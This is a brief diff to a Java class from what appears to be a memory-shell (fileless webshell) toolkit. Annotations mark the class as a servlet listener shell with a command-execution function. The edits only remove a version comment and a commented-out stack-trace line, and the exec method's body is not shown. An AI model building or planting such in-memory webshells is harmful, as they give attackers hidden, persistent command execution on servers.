@@ -12,7 +12,6 @@ import java.lang.reflect.Method;
 /**
  * @author Whoopsunix
  *
- * 8.0.53
  */
 @MemShell(MemShell.Listener)
 @MemShellFunction(MemShellFunction.Exec)
@@ -60,7 +59,6 @@ public class ListenerExec implements InvocationHandler {
 //            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
 //            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
 //        } catch (Exception ignored) {
-//            ignored.printStackTrace();
 //        }
 //    }
     public static String exec(String str) throws Exception {
